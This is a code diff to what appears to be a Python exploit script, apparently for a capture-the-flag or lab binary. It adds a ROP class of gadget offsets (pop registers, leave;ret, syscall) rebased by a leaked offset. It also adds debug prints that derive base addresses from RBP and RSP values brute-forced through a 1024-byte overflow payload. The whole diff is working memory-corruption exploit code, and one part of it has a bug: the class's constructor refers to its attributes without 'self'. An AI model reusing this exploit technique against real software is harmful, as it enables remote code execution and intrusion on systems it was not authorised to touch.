@@ -64,6 +64,26 @@ def brute_force(_Payload):
 
 	return _to_return
 
+class ROP():
+	_pop_RAX_base	= 0x0000000000000b51
+	_pop_RBP_base	= 0x0000000000000a90
+	_pop_RDI_base	= 0x0000000000000f73
+	_pop_RDX_base	= 0x0000000000000b53
+	_pop_RSI_base	= 0x0000000000000f71	# pop rsi ; pop r15 ; ret
+	_pop_RSP_base	= 0x0000000000000f6d	# pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+	_leave_ret_base	= 0x0000000000000b6d
+	_syscall_base	= 0x0000000000000b55
+
+	def __init__(self, ropOffset):
+		self._pop_RAX = _pop_RAX_base + ropOffset
+		self._pop_RBP = _pop_RBP_base + ropOffset
+		self._pop_RDI = _pop_RDI_base + ropOffset
+		self._pop_RDX = _pop_RDX_base + ropOffset
+		self._pop_RSI = _pop_RSI_base + ropOffset
+		self._pop_RSP = _pop_RSP_base + ropOffset
+		self._leave_ret = _leave_ret_base + ropOffset
+		self._syscall = _syscall_base + ropOffset
+
 def main():
 	_Payload = _Correct_User + "A".encode("utf-8") * 1024
 
@@ -78,10 +98,16 @@ def main():
 	_RBP_hex = xor_me(reverse(_RBP)).hex()
 	print("[+] RBP found: {0}".format(_RBP_hex))
 
+	## testing calulations..
+	print("[!] hex math: 0000{0:x}".format(int(_RBP_hex,16) - int("1144",16)))
+
 	## find RSP - used to calculate ROP offset
 	_RSP = brute_force(_Payload + _RBP)	
 	_RSP_hex = xor_me(reverse(_RSP)).hex()
 	print("[+] RSP found: {0}".format(_RSP_hex))
+
+	## testing calulations..
+	print("[!] hex math: 0000{0:x}".format(int(_RSP_hex,16) - int("e5f",16)))
 
 	## test run - should result in "Username found!"
 	test(_Payload)	
